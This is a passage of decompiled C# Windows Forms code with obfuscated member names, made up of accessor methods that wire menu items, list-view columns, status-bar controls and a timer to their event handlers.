
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_5);
        ToolStripMenuItem item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_3 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_18()
    {
        return this.toolStripMenuItem_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_28);
        ToolStripMenuItem item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_4 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual OLVColumn vmethod_2()
    {
        return this.olvcolumn_0;
    }

    internal virtual ToolStripSeparator vmethod_20()
    {
        return this.toolStripSeparator_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_1 = toolStripSeparator_12;
    }

    internal virtual ToolStripMenuItem vmethod_22()
    {
        return this.toolStripMenuItem_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(ToolStripMenuItem toolStripMenuItem_27)
    {
        this.toolStripMenuItem_5 = toolStripMenuItem_27;
    }

    internal virtual ToolStripMenuItem vmethod_24()
    {
        return this.toolStripMenuItem_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_12);
        ToolStripMenuItem item = this.toolStripMenuItem_6;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_6 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_6;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_26()
    {
        return this.toolStripSeparator_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_2 = toolStripSeparator_12;
    }

    internal virtual ToolStripMenuItem vmethod_28()
    {
        return this.toolStripMenuItem_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_11);
        ToolStripMenuItem item = this.toolStripMenuItem_7;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_7 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_7;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(OLVColumn olvcolumn_8)
    {
        this.olvcolumn_0 = olvcolumn_8;
    }

    internal virtual OLVColumn vmethod_30()
    {
        return this.olvcolumn_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_31(OLVColumn olvcolumn_8)
    {
        this.olvcolumn_1 = olvcolumn_8;
    }

    internal virtual ToolStripMenuItem vmethod_32()
    {
        return this.toolStripMenuItem_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_33(ToolStripMenuItem toolStripMenuItem_27)
    {
        this.toolStripMenuItem_8 = toolStripMenuItem_27;
    }

    internal virtual ToolStripMenuItem vmethod_34()
    {
        return this.toolStripMenuItem_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_35(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_9);
        ToolStripMenuItem item = this.toolStripMenuItem_9;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_9 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_9;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_36()
    {
        return this.toolStripSeparator_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_37(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_3 = toolStripSeparator_12;
    }

    internal virtual ToolStripMenuItem vmethod_38()
    {
        return this.toolStripMenuItem_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_39(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_10);
        ToolStripMenuItem item = this.toolStripMenuItem_10;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_10 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_10;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ContextMenuStrip vmethod_4()
    {
        return this.contextMenuStrip_0;
    }

    internal virtual ToolStripSeparator vmethod_40()
    {
        return this.toolStripSeparator_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_41(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_4 = toolStripSeparator_12;
    }

    internal virtual ToolStripMenuItem vmethod_42()
    {
        return this.toolStripMenuItem_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_43(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_29);
        ToolStripMenuItem item = this.toolStripMenuItem_11;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_11 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_11;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_44()
    {
        return this.toolStripSeparator_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_45(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_5 = toolStripSeparator_12;
    }

    internal virtual ToolStripMenuItem vmethod_46()
    {
        return this.toolStripMenuItem_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_47(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_13);
        ToolStripMenuItem item = this.toolStripMenuItem_12;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_12 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_12;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_48()
    {
        return this.toolStripSeparator_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_49(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_6 = toolStripSeparator_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(ContextMenuStrip contextMenuStrip_2)
    {
        this.contextMenuStrip_0 = contextMenuStrip_2;
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_50()
    {
        return this.zeroitAnidasoCircleProgress_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_51(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_1)
    {
        this.zeroitAnidasoCircleProgress_0 = zeroitAnidasoCircleProgress_1;
    }

    internal virtual FastObjectListView vmethod_52()
    {
        return this.fastObjectListView_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_53(FastObjectListView fastObjectListView_2)
    {
        EventHandler handler = new EventHandler(this.method_23);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_24);
        FastObjectListView view = this.fastObjectListView_1;
        if (view != null)
        {
            view.SelectedIndexChanged -= handler;
            view.MouseUp -= handler2;
        }
        this.fastObjectListView_1 = fastObjectListView_2;
        view = this.fastObjectListView_1;
        if (view != null)
        {
            view.SelectedIndexChanged += handler;
            view.MouseUp += handler2;
        }
    }

    internal virtual OLVColumn vmethod_54()
    {
        return this.olvcolumn_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_55(OLVColumn olvcolumn_8)
    {
        this.olvcolumn_2 = olvcolumn_8;
    }

    internal virtual OLVColumn vmethod_56()
    {
        return this.olvcolumn_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_57(OLVColumn olvcolumn_8)
    {
        this.olvcolumn_3 = olvcolumn_8;
    }

    internal virtual OLVColumn vmethod_58()
    {
        return this.olvcolumn_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_59(OLVColumn olvcolumn_8)
    {
        this.olvcolumn_4 = olvcolumn_8;
    }

    internal virtual ToolStripSeparator vmethod_6()
    {
        return this.toolStripSeparator_0;
    }

    internal virtual OLVColumn vmethod_60()
    {
        return this.olvcolumn_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_61(OLVColumn olvcolumn_8)
    {
        this.olvcolumn_5 = olvcolumn_8;
    }

    internal virtual OLVColumn vmethod_62()
    {
        return this.olvcolumn_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_63(OLVColumn olvcolumn_8)
    {
        this.olvcolumn_6 = olvcolumn_8;
    }

    internal virtual OLVColumn vmethod_64()
    {
        return this.olvcolumn_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_65(OLVColumn olvcolumn_8)
    {
        this.olvcolumn_7 = olvcolumn_8;
    }

    internal virtual StatusStrip vmethod_66()
    {
        return this.statusStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_67(StatusStrip statusStrip_2)
    {
        this.statusStrip_0 = statusStrip_2;
    }

    internal virtual ToolStripStatusLabel vmethod_68()
    {
        return this.toolStripStatusLabel_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_69(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_0 = toolStripStatusLabel_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_0 = toolStripSeparator_12;
    }

    internal virtual ToolStripProgressBar vmethod_70()
    {
        return this.toolStripProgressBar_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_71(ToolStripProgressBar toolStripProgressBar_1)
    {
        this.toolStripProgressBar_0 = toolStripProgressBar_1;
    }

    internal virtual ContextMenuStrip vmethod_72()
    {
        return this.contextMenuStrip_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_73(ContextMenuStrip contextMenuStrip_2)
    {
        this.contextMenuStrip_1 = contextMenuStrip_2;
    }

    internal virtual ToolStripMenuItem vmethod_74()
    {
        return this.toolStripMenuItem_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_75(ToolStripMenuItem toolStripMenuItem_27)
    {
        this.toolStripMenuItem_13 = toolStripMenuItem_27;
    }

    internal virtual ToolStripMenuItem vmethod_76()
    {
        return this.toolStripMenuItem_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_77(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_15);
        ToolStripMenuItem item = this.toolStripMenuItem_14;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_14 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_14;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_78()
    {
        return this.toolStripSeparator_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_79(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_7 = toolStripSeparator_12;
    }

    internal virtual ToolStripMenuItem vmethod_8()
    {
        return this.toolStripMenuItem_0;
    }

    internal virtual ToolStripMenuItem vmethod_80()
    {
        return this.toolStripMenuItem_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_81(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_16);
        ToolStripMenuItem item = this.toolStripMenuItem_15;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_15 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_15;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual Timer vmethod_82()
    {
        return this.timer_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_83(Timer timer_2)
    {
        EventHandler handler = new EventHandler(this.method_14);
        Timer timer = this.timer_1;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_1 = timer_2;
        timer = this.timer_1;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_84()
    {
        return this.toolStripMenuItem_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_85(ToolStripMenuItem toolStripMenuItem_27)
    {
        this.toolStripMenuItem_16 = toolStripMenuItem_27;
    }

    internal virtual ToolStripMenuItem vmethod_86()
    {
        return this.toolStripMenuItem_17;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_87(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_17);
        ToolStripMenuItem item = this.toolStripMenuItem_17;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_17 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_17;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_88()
    {
        return this.toolStripMenuItem_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_89(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_18);
        ToolStripMenuItem item = this.toolStripMenuItem_18;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_18 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_18;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(ToolStripMenuItem toolStripMenuItem_27)
    {
        this.toolStripMenuItem_0 = toolStripMenuItem_27;
    }

    internal virtual ToolStripMenuItem vmethod_90()
    {
        return this.toolStripMenuItem_19;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_91(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_19);
        ToolStripMenuItem item = this.toolStripMenuItem_19;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_19 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_19;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_92()
    {
        return this.toolStripMenuItem_20;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_93(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_20);
        ToolStripMenuItem item = this.toolStripMenuItem_20;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_20 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_20;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_94()
    {
        return this.toolStripMenuItem_21;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_95(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_21);
        ToolStripMenuItem item = this.toolStripMenuItem_21;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_21 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_21;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_96()
    {
        return this.toolStripMenuItem_22;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_97(ToolStripMenuItem toolStripMenuItem_27)
    {
        EventHandler handler = new EventHandler(this.method_22);
        ToolStripMenuItem item = this.toolStripMenuItem_22;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_22 = toolStripMenuItem_27;
        item = this.toolStripMenuItem_22;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_98()
    {
        return this.toolStripSeparator_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_99(ToolStripSeparator toolStripSeparator_12)
    {
        this.toolStripSeparator_8 = toolStripSeparator_12;
    }

    private delegate void Delegate75(string string_0, string string_1, string string_2);

    private delegate void Delegate76();

    private delegate void Delegate77();
}

